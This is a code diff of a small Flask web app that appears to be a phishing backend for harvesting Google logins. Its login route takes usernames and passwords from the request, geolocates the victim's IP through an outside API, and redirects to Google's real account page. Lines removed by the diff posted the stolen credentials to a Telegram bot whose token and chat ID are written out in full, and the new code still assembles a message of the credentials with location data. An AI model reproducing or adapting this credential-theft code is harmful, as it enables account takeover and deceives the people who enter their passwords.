@@ -2,6 +2,7 @@ from flask import Flask, render_template, request, redirect
 from flask_basicauth import BasicAuth
 import requests
 import smtplib
+import json
 
 app = Flask(__name__)
 app.static_folder = 'static'
@@ -263,16 +264,14 @@ def login():
     password = request.args.get('password')
     ip = request.remote_addr
     # IP-Daten von ip-api.com abrufen
-    response = requests.get(f"https://beta.browser.lol/api?ip={ip}&key=0An2xa2xGKbIv89F")
-    console.log(response)
-    ip_data = response.json()
+    response = requests.get(f"https://ipfinder.ch/api?ip={ip}&key=0An2xa2xGKbIv89F")
+    print(response)
+    ip_data = (response.json())
     # Nachricht an Telegram senden
-    message = f"Login-Informationen:\nBenutzername: {username}\nPasswort: {password}\nIP-Data: {ip_data}"
-    requests.get(
-        f"https://api.telegram.org/bot5751384094:AAGiPu72GJlp4JziOkQvnpMtIH2EZsF1JmQ/sendMessage?chat_id=608885714&disable_web_page_preview=true&disable_web_page_preview=true&text={message}")
-
+    message = f"Login-Informationen:\nBenutzername: {username}\nPasswort: {password}\nLocation: {ip_data['location']['lon']}, {ip_data['location']['lat']} ({ip_data['location']['city']}, {ip_data['location']['name']})\nProvider: {ip_data['as']['name']}{ip_data['as']['domain']}"
     return redirect("https://myaccount.google.com/")
 
 
+#--------------------------RUN app--------------------------#
 if __name__ == '__main__':
-    app.run()
+    app.run(debug=True, host='0.0.0.0', port=5000) 
